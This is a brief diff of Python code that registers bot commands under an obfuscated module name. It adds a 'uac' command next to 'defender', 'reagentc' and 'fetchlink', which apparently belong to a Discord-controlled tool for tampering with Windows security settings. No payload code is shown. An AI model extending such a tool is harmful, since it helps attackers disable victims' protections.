@@ -66,6 +66,7 @@ bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(fetchlink,na
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(defend,name='defender'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(reagentc,name='reagentc'))
 bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(sites,name='sites'))
+bot.add_command(YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw.Command(uac,name='uac'))
 @bot.event
 async def on_ready():
  await run(bot)
